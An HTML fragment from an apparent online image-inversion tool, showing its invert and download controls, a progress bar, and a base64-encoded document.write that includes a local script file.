  ...
  <div class="toolarea">
    ...
    <div id="container">
      ...
      <div id="options" style="display: none;">
        <button onclick="invertImage()">Invert Now</button>
        <br>
        <progress id="progressBar" value="0" max="100" style="display: none;"></progress>
        <br>
        <div id="successMessage">Image inverted successfully!</div>
        <br>
        <button onclick="downloadImage()">Download Image</button>
      </div>
    </div>
    <script>
      document.write(atob("IDxzY3JpcHQgc3JjPSJqcy9pbWcvMDI3LmpzIiBkZWZlcj0iIj48L3NjcmlwdD4="));
    </script>
